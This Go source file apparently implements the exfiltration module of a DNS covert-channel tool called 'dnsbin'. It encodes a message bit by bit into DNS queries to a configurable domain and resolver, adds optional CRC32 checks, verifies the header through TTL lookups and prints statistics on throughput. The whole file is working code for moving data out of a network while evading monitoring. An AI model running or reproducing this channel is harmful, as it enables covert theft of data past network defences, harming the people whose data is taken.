package exfil

import (
	"dnsbin/config"
	"dnsbin/utils"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
)

func Send(cfg config.Config, message string) {
	u := uuid.New().String()
	shortUUID := strings.Split(u, "-")[0]
	fmt.Printf("\033[32m[+]\033[0m Using UUID: \033[32m%s\033[0m\n", shortUUID)

	startTime := time.Now()
	requestCount := 0

	msgBytes := []byte(message)
	msgLen := uint16(len(msgBytes))

	// v1.6 Header: [Options Byte] + [2-byte Length]
	options := cfg.Options
	header := []byte{options, byte(msgLen >> 8), byte(msgLen & 0xff)}

	crcEnabled := (options & (1 << 2)) != 0
	fmt.Printf("\033[32m[+]\033[0m Options: 0x%02x (CRC32: %v)\n", options, crcEnabled)
	fmt.Printf("\033[32m[+]\033[0m Message length: %d bytes\n", msgLen)

	// Construct full bitstream
	var fullData []byte
	fullData = append(fullData, header...)

	if crcEnabled {
		for i := 0; i < len(msgBytes); i += 256 {
			end := i + 256
			if end > len(msgBytes) {
				end = len(msgBytes)
			}
			chunk := msgBytes[i:end]
			fullData = append(fullData, chunk...)

			// Append 4-byte CRC32 for this chunk
			checksum := crc32.ChecksumIEEE(chunk)
			csBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(csBytes, checksum)
			fullData = append(fullData, csBytes...)
		}
	} else {
		fullData = append(fullData, msgBytes...)
	}

	for i, b := range fullData {
		bits := fmt.Sprintf("%08b", b)
		if cfg.Debug {
			fmt.Printf("\033[32m[+]\033[0m Byte %d: 0x%02x -> Bits: %s\n", i, b, bits)
		} else if i >= 3 {
			os.Stdout.Write([]byte{b})
		}

		var wg sync.WaitGroup
		for bitIdx, bit := range bits {
			if bit == '1' {
				bitPos := i*8 + bitIdx
				query := fmt.Sprintf("%d.%s.%s", bitPos, shortUUID, cfg.Domain)
				wg.Add(1)
				go func(q string) {
					defer wg.Done()
					utils.TriggerQuery(q, cfg.Resolver)
				}(query)
				requestCount++
			}
		}
		wg.Wait()

		// Verify header bytes after sending them
		if i == 2 {
			fmt.Printf("\033[32m[+]\033[0m Verifying header...")
			verified := true
			for bIdx := 0; bIdx < 24; bIdx++ {
				expectedBit := (fullData[bIdx/8] >> (7 - (bIdx % 8))) & 1
				if expectedBit == 1 {
					query := fmt.Sprintf("%d.%s.%s", bIdx, shortUUID, cfg.Domain)
					ttl, err := utils.QueryTTL(query, cfg.Resolver)
					if err != nil || ttl == 0 {
						verified = false
						break
					}
				}
			}
			if verified {
				fmt.Printf(" \033[32mOK\033[0m\n")
			} else {
				fmt.Printf(" \033[31mFAILED\033[0m\n")
			}
		}
	}

	// Send END marker
	endQuery := fmt.Sprintf("end.%s.%s", shortUUID, cfg.Domain)
	utils.TriggerQuery(endQuery, cfg.Resolver)
	requestCount++

	duration := time.Since(startTime)
	if !cfg.Debug {
		fmt.Println()
	}
	fmt.Println("-------------------------------------")
	fmt.Printf("\033[32m[+]\033[0m Done. UUID for recovery: \033[32m%s\033[0m\n", shortUUID)
	fmt.Printf("\033[32m[+]\033[0m Time taken: %.3f seconds\n", duration.Seconds())
	fmt.Printf("\033[32m[+]\033[0m Bytes sent: %d\n", len(message))
	fmt.Printf("\033[32m[+]\033[0m DNS Requests: %d\n", requestCount)
	if duration.Seconds() > 0 {
		fmt.Printf("\033[32m[+]\033[0m Average speed: %.2f bytes/sec\n", float64(len(message))/duration.Seconds())
	}
}